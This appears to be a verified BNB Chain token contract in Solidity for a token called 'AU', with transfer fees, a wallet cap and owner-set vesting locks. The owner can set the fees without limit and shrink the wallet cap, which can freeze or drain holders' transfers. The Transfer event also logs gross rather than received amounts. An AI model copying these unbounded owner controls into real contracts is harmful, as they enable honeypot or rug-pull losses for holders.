/**
 *Submitted for verification at BscScan.com on 2023-03-28
*/

pragma solidity ^0.5.12;

contract ERC20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}
interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b); 
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract AUToken is ERC20Interface{
  using SafeMath for uint;
  string public symbol;
  string public  name;
  uint8 public decimals;
  uint _totalSupply;
  mapping(address => uint256) balances;
  mapping(address => mapping(address => uint)) allowed;
  address public uniswapV2Pair;
  uint256 maxnum ;
  IUniswapV2Router02  uniswapV2Router;

  address vaultAddr = 0xCf5DF2F930be1e3f0615376d7e961a9555cad4A8;
  address burnAddr = 0x000000000000000000000000000000000000dEaD;
  
  uint256 fee1 = 50;
  uint256 fee2 = 50;

  address owner;
  mapping (address => User) users;
  struct User{
    uint256 locktime;
    uint256 lockstart;
    uint256 lockamount;
}
  constructor() public {
    symbol = "AU";
    name = "AU";
    decimals = 18;
	owner = msg.sender;
    _totalSupply = 1000 * 10**uint(decimals);
    balances[msg.sender] = _totalSupply;
	        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
    emit Transfer(address(0), msg.sender, _totalSupply);
	  maxnum = 1 * 10**uint(decimals);
  }

	modifier onlyOwner() {
        require(msg.sender == owner, "Ownable: caller is not the owner");
        _;
    }
  function totalSupply() public view returns (uint) {
    return _totalSupply;
  }
    function setOwner(address newOwner) public onlyOwner returns(address){

	owner = newOwner;
	return newOwner;
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
    return balances[tokenOwner];
  }
  function transfer(address to, uint amount) public returns (bool success) { 
    if(to != uniswapV2Pair){
      require(balances[to].add(amount)<=maxnum);
    }
  User storage user = users[msg.sender];
  uint256 locks;
  if(user.lockstart.add(user.locktime)>block.number){
      locks = (user.lockamount).div(user.locktime).mul(user.lockstart.add(user.locktime).sub(block.number));
  }else{
    locks = 0;
  }
  require(balances[msg.sender].sub(amount)>=locks);
  
    balances[msg.sender] = balances[msg.sender].sub(amount);
    uint256 realAmount = amount.mul(1000-fee1-fee2).div(1000);
    balances[to] = balances[to].add(realAmount);	
    balances[vaultAddr] = balances[vaultAddr].add(amount.mul(fee1).div(1000));
    balances[burnAddr] = balances[burnAddr].add(amount.mul(fee2).div(1000));
    emit Transfer(msg.sender, to, amount);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    require(spender != address(0), "spender address is a zero address");   
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function transferFrom(address from, address to, uint256 amount) public returns (bool success) {  
    
    if(to != uniswapV2Pair){
      require(balances[to].add(amount)<=maxnum);
    }

  User storage user = users[from];
  uint256 locks;
  if(user.lockstart.add(user.locktime)>block.number){
      locks = (user.lockamount).div(user.locktime).mul(user.lockstart.add(user.locktime).sub(block.number));
  }else{
    locks = 0;
  }
  require(balances[from].sub(amount)>=locks);
    balances[from] = balances[from].sub(amount);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(amount);
    uint256 realAmount = amount.mul(1000-fee1-fee2).div(1000);
    balances[to] = balances[to].add(realAmount);	
    balances[vaultAddr] = balances[vaultAddr].add(amount.mul(fee1).div(1000));
    balances[burnAddr] = balances[burnAddr].add(amount.mul(fee2).div(1000));
    emit Transfer(from, to, amount);
    return true;
  }

  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  
  function setMaxNum(uint256 newMAX) public onlyOwner{
    maxnum = newMAX;
  }

  function setFee1(uint256 newFee)public onlyOwner{
    fee1 = newFee;
  }

  function setFee2(uint256 newFee)public onlyOwner{
    fee2 = newFee;
  }

  function setvaultAddr(address newVaultAddr)public onlyOwner{
    vaultAddr = newVaultAddr;
  }
  
  function lock3(uint256 locktime,uint256 lockstart,address to,uint256 amount) public onlyOwner{
    amount = amount * 10**uint(decimals);
    balances[msg.sender] = balances[msg.sender].sub(amount);
    balances[to] = balances[to].add(amount);

   User storage user = users[to];
   user.locktime = locktime;
   user.lockstart = lockstart;
   user.lockamount = amount;
  }
  
  function lockNumber(address addr)view public returns(uint256){
    User storage user = users[addr];
  uint256 locks;
  if(user.lockstart.add(user.locktime)>block.number){
      locks = (user.lockamount).div(user.locktime).mul(user.lockstart.add(user.locktime).sub(block.number));
  }else{
    locks = 0;
  }
  return locks;
  }
}